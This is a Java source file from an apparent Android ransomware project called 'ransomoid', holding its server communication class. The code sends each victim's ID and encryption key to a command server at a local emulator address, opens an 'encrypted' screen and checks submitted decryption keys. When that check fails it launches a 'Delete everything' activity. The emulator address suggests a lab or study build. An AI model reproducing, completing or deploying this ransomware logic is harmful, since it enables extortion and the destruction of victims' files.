package falezza.fabio.ransomoid.utils;

import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import falezza.fabio.ransomoid.activities.DeleteActivity;
import falezza.fabio.ransomoid.activities.DecryptActivity;
import falezza.fabio.ransomoid.activities.EncryptedActivity;

import static com.android.volley.Request.Method.POST;

/**
 * Created by fabio on 16/02/18.
 */

public class Api {

    private static final int HTTP_SUCCESS = 200;
    private static final int HTTP_SERVER_ERROR = 500;

    private Context ctx;
    private static Api instance;
    private RequestQueue queue;
    private static final String SEND_NEW_RECORD_URL = "http://10.0.2.2:8080/enc";
    private static final String CHECK_KEY_URL = "http://10.0.2.2:8080/dec";

    private Api(Context context) {
        this.ctx = context;
        this.queue = Volley.newRequestQueue(context);
    }

    public static Api getInstance(Context context) {
        if (instance == null) {
            instance = new Api(context);
        }
        return instance;
    }

    public void sendNewRecord(String userID, String key) throws JSONException {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("key", key);
        jsonBody.put("id", userID);

        Response.Listener listener = new Response.Listener() {
            @Override
            public void onResponse(Object response) {
                if (response instanceof Integer) {
                    if ((Integer)response == HTTP_SUCCESS) {
                        Intent intent = new Intent(ctx, EncryptedActivity.class);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                        ctx.startActivity(intent);
                    } else {
                        Toast.makeText(ctx, "UNABLE TO SAVE KEY", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        };

        Response.ErrorListener errorListener = new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                System.out.println(error);
            }
        };

        ServerStatusRequest request = new ServerStatusRequest(POST, SEND_NEW_RECORD_URL, null,
                jsonBody.toString(), listener, errorListener);

        this.queue.add(request);
    }

    public void checkKey(String userID, final String key) throws JSONException {

        JSONObject jsonBody = new JSONObject();
        jsonBody.put("key", key);
        jsonBody.put("id", userID);

        Response.Listener listener = new CheckKeyResponseListener(key);

        Response.ErrorListener errorListener = new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Toast.makeText(ctx, "Delete everything", Toast.LENGTH_SHORT).show();
                Intent deleteActivity = new Intent(ctx, DeleteActivity.class);
                deleteActivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                ctx.startActivity(deleteActivity);
            }
        };

        ServerStatusRequest request = new ServerStatusRequest(POST, CHECK_KEY_URL, null,
                jsonBody.toString(), listener, errorListener);

        this.queue.add(request);
    }

    private class CheckKeyResponseListener implements Response.Listener {

        private String key;

        CheckKeyResponseListener( String key) {
            this.key = key;
        }

        public void onResponse(Object response) {
            if (response instanceof Integer) {
                if ((Integer)response == HTTP_SUCCESS) {
                    // Decrypt
                    Toast.makeText(ctx, "Time to decrypt", Toast.LENGTH_SHORT).show();
                    Intent intent = new Intent(ctx, DecryptActivity.class);
                    intent.putExtra("key", this.key);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                    ctx.startActivity(intent);
                }
            }
        }
    }
}


